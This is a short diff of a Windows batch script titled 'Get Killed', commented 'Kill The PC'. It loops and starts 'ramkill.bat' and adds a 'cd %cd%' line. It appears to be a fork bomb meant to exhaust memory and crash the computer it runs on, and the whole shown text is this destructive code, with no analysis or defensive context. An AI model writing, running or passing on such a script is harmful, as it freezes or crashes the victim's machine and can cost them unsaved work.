@@ -1,4 +1,5 @@
 Title Get Killed
+cd %cd%
 rem Kill The PC
 :Loop
 start ramkill.bat
